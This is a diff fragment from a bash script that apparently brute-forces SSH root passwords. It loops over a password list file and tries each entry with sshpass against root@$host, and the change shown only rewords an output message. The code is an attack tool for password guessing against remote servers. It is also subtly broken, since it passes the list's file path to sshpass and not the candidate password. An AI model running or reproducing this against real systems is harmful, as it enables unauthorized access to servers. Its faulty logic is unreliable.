@@ -18,7 +18,7 @@ shift
 password="$2"
 pas=$(cat "$password")
 for passong in $pas; do
-echo -e "\033[93mFind the password for $host : $passong"
+echo -e "\033[93mFind password for $host : $passong"
 sshpass -p "$password" ssh root@$host -p 22 "echo 'Successful login with password: $passong'; break" &>/dev/null
 if [ $? -eq 0 ]; then
         echo -e "\033[92mpassword $host : $passong"
